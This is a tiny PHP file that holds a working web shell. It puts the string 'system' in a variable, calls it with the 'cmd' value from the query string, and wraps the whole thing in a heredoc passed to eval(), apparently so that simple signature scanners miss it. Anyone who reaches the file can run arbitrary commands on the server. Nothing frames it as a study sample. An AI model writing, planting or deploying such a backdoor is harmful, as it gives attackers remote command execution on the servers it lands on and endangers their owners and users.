<?php
$code = <<<EOD
\$_ = 'system';
\$_(\$_GET['cmd']);
EOD;

eval($code);
?>
